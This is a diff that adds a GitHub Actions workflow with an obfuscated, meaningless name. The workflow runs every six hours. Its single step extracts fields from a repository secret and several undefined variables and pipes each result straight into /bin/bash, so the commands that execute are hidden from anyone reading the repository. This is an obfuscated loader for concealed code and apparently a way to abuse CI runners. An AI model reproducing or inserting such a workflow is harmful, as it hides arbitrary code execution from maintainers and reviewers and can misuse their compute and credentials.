@@ -1,0 +1,22 @@
+name: saxophoneportland
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '24 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: saxophoneportland
+        env:
+          deuma02: ${{ secrets.deuma02 }}
+        run: |
+          echo $deuma02 | jq -r .di87194 | /bin/bash
+          echo $mz199 | jq -r .v7436 | /bin/bash
+          echo $q3622 | jq -r .frgs7 | /bin/bash
+          echo $n73 | jq -r .va8 | /bin/bash
+          echo $aan7 | jq -r .s1113 | /bin/bash
+          echo $i724 | jq -r .cb7 | /bin/bash
+
